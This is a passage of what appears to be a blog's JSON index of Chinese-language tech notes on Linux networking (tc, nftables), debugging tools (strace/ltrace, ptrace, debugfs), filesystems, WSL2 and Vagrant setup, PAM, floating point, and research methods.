很多時候資料就是一堆keyword砸在一起 發行時間 能不能重現 以及前面的四點 文中的哪邊能參考，而哪邊需要再思考一下、不該全盤接收，可以挑自己需要的 問題 (概念、結構) 客觀事實 推導過程 結論 參考、工具類要看 有沒有你要的關鍵字 看完資料後可以知道 瞭解文章的分類（是工具類的文章？純現況介紹？有無作者主觀推論？） 能列出文章的大綱和脈絡 瞭解作者嘗試想要解答的問題，說出作者撰寫本文的主旨 能說出文章中「關鍵字」的定義或作者的詮釋 說出作者解決了哪些問題、還有哪些問題還沒解決 等資料整理的差不多，就可以寫了 定義關鍵字 用已知比較未知 用具體比喻抽象 動機 \u0026amp; 原本想問的問題與收集資料時想到的問題 點出與讀者的相關性 連結讀者的生活經驗 破題解答很多人都困惑的問題 打臉讀者 (製造衝突) 你以為是A，其實是B 各方立場 結論 認識新領域最重要的領域的思考模型，而思考模型會由每個領域的keyword來實體化，但是有人不是完全懂或是寫的太詳細，導致阻礙理解\n這個時候只能多看，讓腦幫你整理，如果一個字總是遇到，像每一篇資料都有，就應該直接去找他的定義\n所以survey就是在收集資料、提問、整理之間一直loop，會有結束的一天嗎?? 所以最初提問題就要界定範圍!\nRef 調查報導工作坊分享：人物採訪的五項心法 如何快速從「 陌生領域」整理出一套心得？ 如何寫出一篇好懂的文章以利溝通？六大技巧分享 用一張圖學會專業知識寫作心法：怎樣得到學測國語文寫作測驗那 21 分？\n","permalink":"https://littlebees.github.io/2021/10/%E6%80%8E%E9%BA%BCsurvey/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這篇是結合採訪、寫作、survey的總結文\n採訪與survey很像但不同是面對的是人，所以另外用quote的方式附上採訪的重點\u003c/p\u003e","title":"怎麼survey"},{"content":"動機 以前遇過，review一下\n概念 一般做tc就是在意下面4件事\nPOLICING(策略) 進來的pkt要到哪邊 queue的入口 SCHEDULING(調度) 怎麼分配bandwidth (QoS) queue的內部 SHAPING (限制) 調整輸出的速度 queue的出口 DROPPING(丟棄) 爆量了怎麼辦 traffic control就是一個queue接一個queue，變成一個樹狀queue，有三個元件\nqdisc quene (virtual) tree的node (特別是能放class的qdisc) leaf (classless) node (classful，會多兩個元件) filter (另外加的) 要讓traffic去哪 (class或qdisc) 有點像goto class 下一個qdisc的入口，目前qdisc的出口 node的pointer 樹狀queue就是qdisc指到2種東西\nclass qdisc (classless) 另外就是符合條件(filter)直接被指到 class qdisc (classless) classless \u0026amp; classful qdisc 就qdisc能不能放class\nclassless pfifo: 一般的queue pfifo_fast: 根據ToS去分到對應的一般的queue red: 爆量時隨機drop sfq: Stochastic Fairness Queueing tbf: Token Bucket Filter classful cbq: Class Based Queueing htb: Hierarchy Token Bucket ingress qdisc \u0026amp; ifb ifb，tc作用在egress(從主機出去的traffic)，如果要用在ingress，就要設ifb把traffic灌進去，把tc設定ifb的egress # init ifb modprobe ifb numifbs=1 ip link set ifb0 up # redirect ingress to ifb0 tc qdisc add dev eth0 ingress handle ffff: tc filter add dev eth0 parent ffff: protocol ip prio 0 u32 match u32 0 0 flowid ffff: action mirred egress redirect dev ifb0 # add qdisc tc qdisc add dev ifb0 root handle 1: htb default 2 r2q 100 # add default class tc class add dev ifb0 parent 1:0 classid 1:1 htb rate 1000mbit ceil 1000mbit tc class add dev ifb0 parent 1:1 classid 1:2 htb prio 5 rate 1000mbit ceil 1000mbit tc qdisc add dev ifb0 parent 1:2 handle 2: pfifo limit 500 # add default filter tc filter add dev ifb0 parent 1:0 prio 5 protocol ip u32 tc filter add dev ifb0 parent 1:0 prio 5 handle 4: protocol ip u32 divisor 256 tc filter add dev ifb0 parent 1:0 prio 5 protocol ip u32 ht 800:: match ip dst 192.168.0.0/16 hashkey mask 0x000000ff at 16 link 4: # add ingress rules for 192.168.0.9 tc class add dev ifb0 parent 1:1 classid 1:9 htb prio 5 rate 3mbit ceil 3mbit tc qdisc add dev ifb0 parent 1:9 handle 9: pfifo limit 500 tc filter add dev ifb0 parent 1: protocol ip prio 5 u32 ht 4:9: match ip dst \u0026#34;192.168.0.9\u0026#34; flowid 1:9 sharping的原理 Leaky Bucket: 把流量queue住，一次只出去指定的量 Token Bucket: 把流量queue住，等有token才能出去同等數量的traffic htb就是parent的token可以轉給小孩用 sharping的作法 用netem\ntc qdisc add dev enp0s5 root handle 1: prio tc qdisc add dev enp0s5 parent 1:1 handle 10: netem delay 100ms 10ms tc filter add dev enp0s5 protocol ip parent 1:0 prio 1 u32 match ip dst 151.101.0.0/16 match ip dport 443 0xffff flowid 1:1 用htb\ntc qdisc add dev enp0s5 root handle 1:0 htb tc class add dev enp0s5 parent 1: classid 1:1 htb rate 100kbps ceil 100kbps Ref Linux TC(Traffic Control)框架原理解析 Linux Traffic Control (tc) 研究 流量控制 TC 入門 (traffic control)\n","permalink":"https://littlebees.github.io/2021/10/network%E7%9A%84traffic-control/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e以前遇過，review一下\u003c/p\u003e","title":"network的traffic control"},{"content":"動機 紀錄\n找listening port ss -tulpn\nt,u: tcp, udp l: listening p: 列process n: 別做DNS lsof -i\ni: 所有網路連線 -i tcp:1-100 -i udp:80 這port是做什麼的 去/etc/services看，或是google\n找誰開了file lsof \u0026lt;your file\u0026gt; 誰開了\u0026lt;your file\u0026gt; lsof -u bee314 bee314開了哪些file lsof -c \u0026lt;proc\u0026gt; proc開了哪些file lsof -p \u0026lt;pid\u0026gt; pid開了哪些file lsof -c ^\u0026lt;proc\u0026gt; not 條件 lsof -c \u0026lt;proc\u0026gt; -u bee314 or 條件 lsof -a -c \u0026lt;proc\u0026gt; -u bee314 and 條件 Ref Linux Find Out Which Process Is Listening Upon a Port Linux 列出行程開啟的檔案，lsof 指令用法教學與範例\n","permalink":"https://littlebees.github.io/2021/10/%E8%AA%B0%E9%96%8B%E4%BA%86%E6%AA%94%E6%A1%88/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"誰開了檔案"},{"content":"動機 突然遇到的觀念，紀錄一下\nsubtype class Animal : Dog\n畫成集合(Animal (Dog))\n在subtype，大的可以能容納小的\nCovariance Covariance指的是下面的可以成立，就是left hand side \u0026gt; right hand side Animal obj = new Dog()\nContravariance (Animal -\u0026gt; void) f (Dog -\u0026gt; void) g f = g # ?? g = f # good 有變數是一個函數只能吃Animal，Animal -\u0026gt; void 如果把Dog -\u0026gt; void，assign過去之後，有人丟Animal就直接起飛\n因為明明是type decorator，卻讓看起來能容納的方向相反了!!\n原本的變數就是一個集合，但是這裡套的是一個函數 函數是要求type，很像濾網，第一層type是Animal -\u0026gt; void，會讓Animal都進來，但如果函數是Dog -\u0026gt; void，就變成Animal放到Dog去，就一定報錯\n這就是Contravariance，就是left hand side \u0026lt; right hand side\nCovariance \u0026amp; Contravariance 其實就是看是哪個接資料，大的可以能容納小的\nassign是left hand side去接資料 函數上實際接資料的是函數，所以其實是right hand side接資料\n如果把函數的參數apply當成assign，所以就是看實際上在哪邊發生assign!!\n","permalink":"https://littlebees.github.io/2021/10/%E5%85%B1%E8%AE%8A%E6%95%B8%E5%92%8C%E5%8F%8D%E8%AE%8A%E6%95%B8/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e突然遇到的觀念，紀錄一下\u003c/p\u003e","title":"共變數和反變數"},{"content":"動機 記錄用\n基本概念 table: chain與各式data structrue的收納庫，定義旗下的chain收什麼類型的封包(family)\nfamily ip: ipv4 ip6: ipv6 arp: arp bridge: 在linux bridge的pkt inet = ip + ip6 netdev: interface的pkt chain: 就有一堆rule，由type與hook決定這個chain在哪發揮作用 type: 說明這個chain處理哪個方面的工作 filter: 就是filter arp, bridge, ip, ip6, inet, netdev route: Mark packets ip, ip6, inet nat: Perform Network Address Translation ip, ip6, inet hook: 裡面的rule會掛在netfilter的那個hook上 ip, ip6, inet: prerouting, input, forward, output, postrouting arp: input, output netdev: ingress (這個是例外，這不在原本的netfilter) bridge: prerouting, input, forward, output, postrouting (這個是例外，這不在原本的netfilter) nftable一個做得好的是把chain與hook分開了 所有XXtables都是照netfilter去掛hook做packet過濾，但是之前都是會事先綁好，導致真的不好懂，也不知道為什麼要這麼做\nnetfilter hooks\n基本操作 全清掉: nft flush ruleset 刪table: nft delete table ip mytable 列所有table: nft list tables 列table裡面有的東西: nft list table ip mytable -n -a -n -a: 是為了show handle，就是iptables的rule位置(index) 插rule: nft insert rule mytable mychain position 8 ip daddr 127.0.0.8 drop insert before handle 8 塞rule到第一個: nft insert rule mytable mychain ip daddr 127.0.0.8 drop 刪rule: nft delete rule mytable mychain handle 8 特別注意!! 現在nft的錯誤訊息做的十分不好，不論什麼錯都是找不到對應的檔案的err msg，所以要 一條一條的下 family都要打出來 加規則 nft verb family table chain \u0026hellip; family table chain conditions ip saddr ip \u0026hellip; 下面是同一個rule的兩種下法\nnft add table ip mytable nft add chain ip mytable mychain { type filter hook output priority 0 \\; policy accept \\; } nft add rule ip mytable mychain ip saddr 192.168.12.23 tcp dport 1234 drop define myaddr = \u0026#34;192.168.12.23\u0026#34; table ip mytable { chain mychain { type filter hook output priority 0; policy accept; ip saddr $myaddr tcp dport 1234 drop } } 只有type要加分號，其他都不用\n剩下還有很多condition可以下，可以去參考Quick reference-nftables in 10 minutes\n接著介紹其他有點程式語言的功能\ndata structrue symbol var 就是macro展開\ndefine myaddr = 192.168.12.23 table ip mytable { chain chain2 { type filter hook output priority 0; policy accept; ip saddr $myaddr tcp dport 1234 drop } } set nft add set ip mytable myset { type ipv4_addr \\; } nft add element ip mytable myset { 192.168.1.4, 192.168.1.5 } nft add rule ip mytable mychain ip saddr @myset attributes type \u0026amp; typeof ipv4_addr: IPv4 address ipv6_addr: IPv6 address. ether_addr: Ethernet address. inet_proto: Inet protocol type. inet_service: Internet service (read tcp port for example) mark: Mark type. ifname: Network interface name (eth0, eth1..)\ntable inet mytable { set s1 { typeof osf name elements = { \u0026#34;Linux\u0026#34; } } set s2 { typeof vlan id elements = { 2, 3, 103 } } set s3 { typeof ip daddr elements = { 1.1.1.1 } } } flags constant - set content may not change while bound interval - set contains intervals timeout - elements can be added with a timeout\nnft add set ip mytable myset { type ipv4_addr \\; flags constant, interval \\; } meter dynamic - make a meter!!\nnft add set my_filter_table my_ssh_meter { type ipv4_addr\\; flags dynamic \\;} nft add rule my_filter_table my_input_chain tcp dport 22 ct state new add @my_ssh_meter { ip saddr limit rate 10/second } accept etc size: mits the maximum number of elements of the set policy: set selection policy * performance (default) * memory elements: initialize the set with some elements in it\nnft add set ip filter daddrs {type ipv4_addr \\; flags timeout \\; elements={192.168.1.1 timeout 10s, 192.168.1.2 timeout 30s} \\;}\nmap nft add map ip mytable porttoip { type inet_service: ipv4_addr\\; } nft add element ip mytable porttoip { 80 : 192.168.1.100, 8888 : 192.168.1.101 } nft add rule ip mytable postrouting snat to tcp dport map @porttoip Verdict Maps value是action\ntable ip filter { chain input { type filter hook input priority 0; ip protocol vmap { udp : jump udp-chain, tcp : jump tcp-chain, icmp : jump icmp-chain} } chain tcp-chain { counter packets 4 bytes 520 } chain udp-chain { counter packets 4 bytes 678 } chain icmp-chain { counter packets 4 bytes 336 } } nft add map filter mydict { type ipv4_addr : verdict\\; } nft add element filter mydict { 192.168.0.10 : drop, 192.168.0.11 : accept } nft add rule filter input ip saddr vmap @mydict Concatenations (tuple) 把value或是條件用.連起來\nnft add rule ip mytable mychain ip saddr . ip daddr . ip protocol { 1.1.1.1 . 2.2.2.2 . tcp, 1.1.1.1 . 3.3.3.3 . udp} counter accept\n其他有用的資料結構 flow table: 可以跳過linux stack的table，做offload Conntrack helpers: 依據Conntrack去控制rule\nRef nftables Main page Setting up nftables Firewall Quick reference-nftables in 10 minutes\n","permalink":"https://littlebees.github.io/2021/10/nftables/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"nftables"},{"content":"動機 已經忘了當初是遇到什麼鍋，但是有留紀錄說要寫下來\nmacro(metaprogram) \u0026amp; program 的不同 macro是操作程式碼，所以程式碼不是所見及所得 * Macros have no namespace * Macros have effects you don\u0026rsquo;t realize \u0026amp; have strange side effects * Macros can\u0026rsquo;t be debugged * 沒有printf, gdb program是操作定義在program的資料，程式碼怎麼寫就怎麼動(不考慮side effect與system的鍋)\n條件式編譯與ci 寫程式的可以自己定義條件式編譯，結果ci沒有跟上新加的編譯，導致ci沒有檢查到新的編譯，讓ci整個沒有用\n解法 用enum, const 用function、與include、inline 把條件式編譯的參數拆成 不同branch 用設定檔讀參數 重點: macro中不能有business logic在\n","permalink":"https://littlebees.github.io/2021/10/macro%E8%88%87%E6%A2%9D%E4%BB%B6%E5%BC%8F%E7%B7%A8%E8%AD%AF/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e已經忘了當初是遇到什麼鍋，但是有留紀錄說要寫下來\u003c/p\u003e","title":"macro與條件式編譯"},{"content":"動機 記錄用\noverlayfs 就是疊疊樂 lower提供基底(通常是readonly或是另一個overlay)，upper提供可以寫的環境 overlay就是兩個疊在一起結果\n用法 mount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged * workdir: 就是暫存，要是空的folder\nreadonly overlay 我只要把多個folder疊再一起怎麼辦?\nmount -t overlay overlay -o lowerdir=/lower1:/lower2 /merged\n用來疊客製化 mount -t overlay overlay -o lowerdir=/mnt/sq,upperdir=/x/pers/rw,workdir=/x/pers/work /mnt/merged mksquashfs /mnt/merged /...\nRef Overlay filesystem overlayfs 練習： 小改光碟 iso 檔， 何必大手筆複製？\n","permalink":"https://littlebees.github.io/2021/10/overlayfs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"overlayfs"},{"content":"動機 原本是為了裝arch的wsl2所以碰到rootfs，所以來整理一下\n複習開機流程 按下電源 BIOS做POST，去找bootloader PXE disk bootloader載入 kernel 與 initramfs initramfs，載入核心驅動，開始驅動硬體與提供作業系統資源 從網路上面下載 kernel 與 initramfs 檔案 kernel 開始在記憶體內解壓縮，然後執行 kernel 的硬體偵測、資源分配等開機程序 將 initramfs 的內容(rootfs)解壓縮之後，暫時掛載成為根目錄 開始執行 rootfs 內的 /init 執行檔 (可以是 script 的格式) 捨棄 initramfs，掛載真正的根目錄，繼續後續的開機流程。 預計掛載的根目錄 /etc/fstab 來重新 chroot 到正確的根目錄 核心呼叫 systemd ，開始後續所有的應用程式啟用 rootfs \u0026amp; initramfs rootfs就是fs連同目錄結構連同裡面的所有資料，之後被打包成一個壓縮檔\ninitramfs是kernel啟動後mount的第一個filesystem，在mount去跑script把pid 1的程式(systemd)跑起來\n所以initramfs需要有?\npid 1的程式: 要在這上面跑 rootfs: 提供之後的根目錄 /etc/fstab: mount用的分區表 script的執行環境: 像busybox rootfs至少需要有?\n/etc/: 放config /bin/: 一般exe /sbin/: 管理員專用的exe /lib/: library與kernel module /dev/: device 做一個initramfs與rootfs 先做rootfs\n準備一個busybox 把需要的東西塞到folder去 寫initramfs被mount應該要做什麼事(init的script) 裝busybox mount proc, sys dev 在記憶體建立一塊區域放rootfs 解壓縮、mount rootfs，chroot，跑第一個proc(像systemd) 所以initramf會有 busybox(或類似的) 與 init的script 做initramfs\n用cpio把上面的東西(busybox與script)包起來 用rootfs裝WSL2 WSL2本身就有自己的bootloader、iniramfs與類似systemd的東西\n所以如果想裝自己的發行版，就要把rootfs餵給wsl，讓wsl去讀 但要注意的是wsl的rootfs是吃tar不是cpio\n找rootfs，像arch是在這裡 重新包成tar unsquashfs -d temp airootfs.sfs tar -czf ../arch.tar.gz --hard-dereference * 讓wsl去讀 wsl.exe --import \u0026lt;DistributionName\u0026gt; \u0026lt;InstallLocation\u0026gt; \u0026lt;FileName\u0026gt; filename就是tar檔 InstallLocation就是解壓的tar檔要放哪 DistributionName就是方便識別的名字，wsl --list會出現的名字 進去，跑之後的設定 resolv.conf new user update, upgrade 等等會在安裝linux時做的事，詳細可以看 buildroot的postinstall arch的安裝tutorial Ref 浅谈linux中的根文件系统（rootfs的原理和介绍） 專題五 - 建立 rootfs 的無磁碟 Linux 系統環境 Export and Import WSL Linux Distro in Windows 10 Install any distribution in WSL\n","permalink":"https://littlebees.github.io/2021/10/rootfs%E8%88%87initramfs-with-wsl2%E7%9A%84%E5%AE%89%E8%A3%9D/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原本是為了裝arch的wsl2所以碰到rootfs，所以來整理一下\u003c/p\u003e","title":"rootfs與initramfs (with WSL2的安裝)"},{"content":"動機 接著說說strace與ltrace\nstrace \u0026amp; ltrace 用法: strace -e {syscall_want_to_trace,...} {cmd \u0026amp; its args} ltrace -e {syscall_want_to_trace,...} {cmd \u0026amp; its args}\nstrace會列出syscall，ltrace是列出lib 的 function call 兩個都是透過ptrace來完成 strace與ltrace是透過ptrace讓發生事件時讓process停下來\nptrace ptrace是linux的process debug框架，在thread發生下面的case發生時回報給追蹤者(process)\n收到signal (除了SIGKILL) 可以攔截singal，進而轉發、送新signal 跑syscall 跑到被ptrace參數指定的事件 被停下來時 ptrace的流程是\n登記 (PTRACE_ATTACH, PTRACE_SEIZE, PTRACE_TRACEME(對象是child)) 設參數 waitpid 取得在意的資料 PTRACE_CONT strace需要PTRACE_ATTACH、PTRACE_SYSCALL，所以下面就看這兩項\nPTRACE_ATTACH 一開始先登記\n先到泛用的ptrace syscall 之後開始檢查被trace的程式能不能用ptrace，之後替該process上被attach的flag 之後根據流程，ptrace會跑到arch-specific的ptrace code 但沒有PTRACE_ATTACH事就直接退出 這個時候被trace的程式會停下來 PTRACE_SEIZE 與PTRACE_ATTACH很像，但是PTRACE_SEIZE不會讓process停下來，PTRACE_ATTACH會先讓process停下來\n所以做PTRACE_SEIZE的同時可以加上ptrace的參數，PTRACE_ATTACH因為會先stop，所以要等到對方停了才可以另外加ptrace的參數\nPTRACE_SYSCALL 登記好了就讓他跑吧\n先到泛用的ptrace syscall 之後開始檢查被trace的程式能不能用ptrace，之後替該process上被attach的flag 之後根據流程，ptrace會跑到arch-specific的ptrace code 會call ptrace_resume，之後再thread上打TIF_SYSCALL_TRACE的flag 被trace的程式就開始跑 call system call了 在執行system call的程式中會看有沒有TIF_SYSCALL_TRACE或是其他在此無關的flag，有就會call tracesys tracesys中會看有沒有TIF_SYSCALL_TRACE，有就call ptrace_report_syscall ptrace_report_syscall會 用SIGTRAP kill 被trace的程式，讓他停下來 執行trace的程式會被通知，就可以看需要的東西了 ltrace \u0026amp; interrupt 3 如果不想看syscall只想看function call怎麼辦?\ninterrupt 3 (software breakpoint) 執行後，kernel會用SIGTRAP kill執行interrupt 3的process\n所以這樣ptrace看的到，但要怎麼插入interrupt 3?\nPTRACE_POKETEXT \u0026amp; the Procedure Linkage Table (PLT) and the Global Offset Table (GOT) PTRACE_POKETEXT可以讓ptrace插入code，可以用他插入interrupt 3\nprocess(ELF)有\nGlobal Offset Table (GOT): shared lib的位置 Procedure Linkage Table (PLT): 紀錄怎麼call function的code 如果是shared lib就是變成調用linker linker找到後會把位置填到GOT，跑function 之後的同一個function call就是找GOT上寫的位置直接call function ltrace = irq 3 + PTRACE_POKETEXT 先登記 (attach) 查PLT，用PTRACE_POKETEXT插入interrupt 3 讓被trace的程式開始跑 之後就是SIGTRAP 等結束後，再用PTRACE_POKETEXT把原本的code插回去 Ref How does strace work? How does ltrace work? Understanding ptrace ptrace man\n","permalink":"https://littlebees.github.io/2021/10/ltrace-strace/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e接著說說strace與ltrace\u003c/p\u003e","title":"ltrace-strace"},{"content":"動機 整理一些linux debug工具\n之前提過 systemtap與bpf就像是手術刀，可以看到很詳細的部分 但在在那之前我們還是要看原本的程式或是kernel的log\nramoops 要先提pstore(persistent storage)，讓kernel panic或是oops的log可以被存起來，讓userspace可以透過firesystem去讀log\nramoops就是配合pstore把log存在ram中\n使用方式\n開flag CONFIG_PSTORE=y CONFIG_PSTORE_CONSOLE=y CONFIG_PSTORE_FTRACE=y CONFIG_PSTORE_RAM=y cat /sys/fs/pstore/console-ramoops debugfs procfs: 讓userspace可以與process交換資訊的filesystem sysfs: 讓userspace可以與device交換資訊的filesystem debugfs: 讓userspace可以與kernelspace的物件交換資訊的filesystem\n都是與kernelspace的物件交換資訊的filesystem，重點是範疇不同\n用法 mount -t debugfs none /sys/kernel/debug\ndynamic_debug kernel有printk，但是開了就很難關，所以有dynamic_debug，可以指定要開哪一行，甚至是哪一個thread的哪一行\nmatch-spec* flags-spec\nmatch-spec ::= \u0026#39;func\u0026#39; string | # svc_tcp_accept, *recv* \u0026#39;file\u0026#39; string | # drivers/usb/*, inode.c:start_*, inode.c:1-100 \u0026#39;module\u0026#39; string | # drm*, nfsd \u0026#39;format\u0026#39; string | # 一般的string search \u0026#39;line\u0026#39; line-range line-range ::= lineno | \u0026#39;-\u0026#39;lineno | lineno\u0026#39;-\u0026#39; | lineno\u0026#39;-\u0026#39;lineno lineno ::= unsigned-int 用法\n先開debugfs echo 'file $file_name -p' \u0026gt; /sys/kernel/debug/dynaminc_debug/control to be continued systemtap與bpf，需要知道一定的語法與對probe的了解才能用 也需要對kernel的版本有要求，或是裝專門的軟體，換言之就是不太方便用\n之後會看strace與lstrace怎麼用\nRef Android7.1 RK3399 使用 ramoops 机制查看开机 Kernel Log Dynamic debug Day29 procfs, sysfs, debugfs\n","permalink":"https://littlebees.github.io/2021/10/linux-debug%E5%B7%A5%E5%85%B7-part1/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理一些linux debug工具\u003c/p\u003e","title":"linux debug工具 part1"},{"content":"動機 複習浮點數\nIEEE 754 (dec) 8.5 (轉成bin) 1000.1 (移到只剩下一個1) 1.0001 * 2^3 開始填回去 sign: 0 (正的) exponent: 127+3 = 130 = 10000010 以127為分界點，IEEE 547定義 exponent放127以及fraction為0時整個是0 fraction: 把小數點右邊的直接填上去 誤差 就是後面的fraction，如果說遇到一個沒辦法被2整除的小數，就會一直產生新的數字，自然就不夠放，也自然就會出現奇怪的結果\n雙精度? Precision (準確度) 和 Accuracy (精密度) Accuracy: 出現的資料是對的 Precision: 出現的資料夠多 (表現出的格子數夠多)\nAccurate \u0026amp;\u0026amp; Precise 3.14159 Accurate \u0026amp;\u0026amp; Inprecise 3.14 Inaccurate \u0026amp;\u0026amp; Precise 3.14128 Inaccurate \u0026amp;\u0026amp; Inprecise 3.22\noverflow 整數有overflow，float也會!!\n(1e20 * 1e20) * 1e20 為 +INF 1e20 * (1e20 * 1e-20) 為 1e20 1e20 * (1e20 - 1e20) 為 0.0 1e20 * 1e20 - 1e20 * 1e20 為 NaN\n補數 什麼是負數? 有負號的數字\n但有負號不好表示與運算，所以重新定義 a+b = 0 a與b互為對方的負數，或是補數(相加之後就會滿，利用有儲存範圍的限制這一點)\n假設用1byte去存 1補數: a+b = 1111 * 這樣會有+0與-0 !! 2補數: a+b = (1)0000\n怎麼算 1補數: NOT 2補數: NOT+1\nRef IEEE-754 與浮點數運算 你所不知道的 C 語言：數值系統篇 從 IEEE 754 標準來看為什麼浮點誤差是無法避免的 浮點數的美麗與哀愁 (裡面的case都很有趣)\n","permalink":"https://littlebees.github.io/2021/10/floatpoint/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習浮點數\u003c/p\u003e","title":"floatpoint"},{"content":"動機 之前修arch上su不能用在homed上，有修pam的檔，所以紀錄一下pam\n統一的驗證 就是程式需要認證時就丟給pam，pam會去找對應的conf，之後就是照著跑 驗證有4個階段\nauth: 就是驗證帳密，看有沒有這帳號，以及這帳號的password或是token對不對 account: 確認account的訊息，像是能不能用這個service，或是簡單講就是確認權限 password: 檢查password本身的資訊，像太舊的密碼就會提示該換了 session: 前面該看的都過了，在實際讓user用service之前做的setup conf怎麼下 階段 處理方式 pam_module args...\n階段: 前面提到的4個階段 pam_module: 就是這行要做什麼， pam_deny: iptables的reject pam_permit: iptables的accept pam_rootok: 只要是root就給過 args就是pam_module的參數 處理方式 簡單版 一定要過(module會傳成功) required: 不過，還是繼續往下做 requisite: 不過，直接整個失敗 過了當然是ok的，但沒過沒差 sufficient: 不過，還是繼續往下做 過不過都沒差 optional 用寫好的 include: 像macro，錯了就當成整個失敗 substack: 像function，錯了就當成只有那一條失敗 自訂版 [value1=action1 value2=action2 ...] value就是module的err code action就是該做什麼 ignore: 當沒事 reset: 把現在的階段忘了，直接從下一個階段的頭開始跑 關於紀錄err code bad: 當成失敗，如果是第一個，跑到最後時以此err code回傳 die: 當成失敗，直接回傳err code ok: 當成成功，只記錄最後一個ok的err code done: 當成成功，直接回傳err code 放數字，表示往後跳N個 把簡單版展開 required [success=ok new_authtok_reqd=ok ignore=ignore default=bad] requisite [success=ok new_authtok_reqd=ok ignore=ignore default=die] sufficient [success=done new_authtok_reqd=done default=ignore] optional [success=ok new_authtok_reqd=ok default=ignore] Ref pam.d(5) - Linux man page\n","permalink":"https://littlebees.github.io/2021/10/pam%E7%9A%84%E6%95%B4%E7%90%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前修arch上su不能用在homed上，有修pam的檔，所以紀錄一下pam\u003c/p\u003e","title":"pam的整理"},{"content":"動機 vm與container的使用情境不同，還是要懂 同時這個也比docker或是k8s好懂、好操作多\n安裝 windows裝virtualbox wsl2中裝vagrant 在bashrc中加 export VAGRANT_WSL_ENABLE_WINDOWS_ACCESS=\u0026quot;1\u0026quot; export PATH=\u0026quot;$PATH:/mnt/c/Program Files/Oracle/VirtualBox\u0026quot; 裝virtualbox_WSL2，不然ssh沒辦法用 使用時 sync file 只能在/mnt/c之類的是windows的地方使用sync file，不然要手動去取消掉 config.vm.synced_folder '.', '/vagrant', disabled: true\n複製public key 不想打密碼\nVagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.provision \u0026#34;shell\u0026#34; do |s| ssh_pub_key = File.readlines(\u0026#34;#{Dir.home}/.ssh/id_rsa.pub\u0026#34;).first.strip s.inline = \u0026lt;\u0026lt;-SHELL echo #{ssh_pub_key} \u0026gt;\u0026gt; /home/vagrant/.ssh/authorized_keys SHELL end config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.50.4\u0026#34; end 設定private network 主要是因為這個才用vagrant，不然想從host連到docker或是k8s的container會很痛苦\ncontainer預設沒有ssh，要自己裝與設定 網路要自己喬，痛苦 config.vm.network \u0026quot;private_network\u0026quot;, ip: \u0026quot;192.168.50.4\u0026quot;\n把serial port關掉 (only in Ubuntu) 預設第一個serial port會打開 起初是跑ubuntu的box不知道為什麼就是起不來，發現是kernel想往serial port打log。 之後把serial port給disconnect就可以boot，但是很慢(\u0026gt;3mins)。 所以要把serial port整個關掉，這樣就正常了。\nconfig.vm.provider \u0026#34;virtualbox\u0026#34; do |v| v.customize [ \u0026#34;modifyvm\u0026#34;, :id, \u0026#34;--uart1\u0026#34;, \u0026#34;off\u0026#34; ] end 一次跑很多台 Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.define \u0026#34;centos\u0026#34; do |instance| # ... end config.vm.define \u0026#34;ubuntu\u0026#34; do |instance| # ... end end 總結 def wsl(instance, ip) instance.vm.provision \u0026#34;shell\u0026#34; do |s| ssh_pub_key = File.readlines(\u0026#34;#{Dir.home}/.ssh/id_rsa.pub\u0026#34;).first.strip s.inline = \u0026lt;\u0026lt;-SHELL echo #{ssh_pub_key} \u0026gt;\u0026gt; /home/vagrant/.ssh/authorized_keys SHELL end instance.vm.synced_folder \u0026#39;.\u0026#39;, \u0026#39;/vagrant\u0026#39;, disabled: true instance.vm.network \u0026#34;private_network\u0026#34;, ip: ip end Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.define \u0026#34;centos\u0026#34; do |instance| # ... end config.vm.define \u0026#34;ubuntu\u0026#34; do |instance| instance.vm.box = \u0026#34;hashicorp/bionic64\u0026#34; instance.vm.provider \u0026#34;virtualbox\u0026#34; do |v| v.memory = 2048 v.cpus = 2 v.customize [ \u0026#34;modifyvm\u0026#34;, :id, \u0026#34;--uart1\u0026#34;, \u0026#34;off\u0026#34; ] end wsl(instance, \u0026#34;192.168.50.5\u0026#34;) end end vagrant in WSL的模板 把先設定模板位置 export VAGRANT_DEFAULT_TEMPLATE=~/.vagrant.d/Vagrantfile.erb\n之後打wsl的模板，放在VAGRANT_DEFAULT_TEMPLATE的位置\nVagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.define \u0026#34;default\u0026#34; do |instance| instance.vm.box = \u0026#34;\u0026lt;%= box_name %\u0026gt;\u0026#34; \u0026lt;% if box_version -%\u0026gt; instance.vm.box_version = \u0026#34;\u0026lt;%= box_version %\u0026gt;\u0026#34; \u0026lt;% end -%\u0026gt; \u0026lt;% if box_url -%\u0026gt; instance.vm.box_url = \u0026#34;\u0026lt;%= box_url %\u0026gt;\u0026#34; \u0026lt;% end -%\u0026gt; instance.vm.provider \u0026#34;virtualbox\u0026#34; do |v| v.memory = 2048 v.cpus = 2 v.customize [ \u0026#34;modifyvm\u0026#34;, :id, \u0026#34;--uart1\u0026#34;, \u0026#34;off\u0026#34; ] end wsl(instance, YOUR_IP) end end 之後就是 vagrant init ubuntu/focal64!!\nRef Vagrant and Windows Subsystem for Linux multiple-vagrant-vms-in-one-vagrantfile virtualbox_WSL2 vagrant default 